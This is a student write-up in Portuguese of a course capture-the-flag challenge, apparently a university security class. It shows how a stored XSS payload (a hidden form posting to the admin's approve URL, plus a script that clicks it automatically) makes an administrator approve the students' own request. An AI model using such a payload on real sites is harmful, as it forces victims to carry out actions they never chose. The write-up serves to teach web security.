## Processo utilizado para resolver o CTF da Semana 6

Começamos por introduzir uma justificação qualquer:
![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_1.PNG)
Fomos redirecionados para a seguint página:
![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_2.PNG)
De seguida fomos à página onde o administrador aceita ou não os pedidos:
![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_3.PNG)
Aqui, inspecionamos a página e vimos o codigo dos botões que o administrador deve clicar:
![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_4.PNG)

Com isto, copiamos o codigo do botão de aceitar o pedido, retirando o disabled, e mudando o url da action, colocando o caminho completo, porque se não o fizessemos, iriamos ser redirecinados para a porta 5004, e mudamos o id do pedido para o id do novo pedido, resultando em:

`http://ctf-fsi.fe.up.pt:5005/request/ed6748362972777c957ca7f8495555b62bdee3aa/approve`

Além disso, adicionamos um script javascript que clica automaticamente no butão, que acabamos de adicionar. O resultado foi o seguinte:
```html
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/ed6748362972777c957ca7f8495555b62bdee3aa/approve" role="form">     
    <div class="submit">                  
        <input type="submit" id="giveflag" value="Give the flag">              
    </div> 
</form>
<script>document.getElementById("giveflag").click();</script>
```

![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_5.PNG)

![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_6.PNG)
![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_7.PNG)

`http://ctf-fsi.fe.up.pt:5004/request/ed6748362972777c957ca7f8495555b62bdee3aa`

![image](https://git.fe.up.pt/fsi/fsi2324/logs/l06g07/-/raw/main/images/xss_csrf_8.PNG)
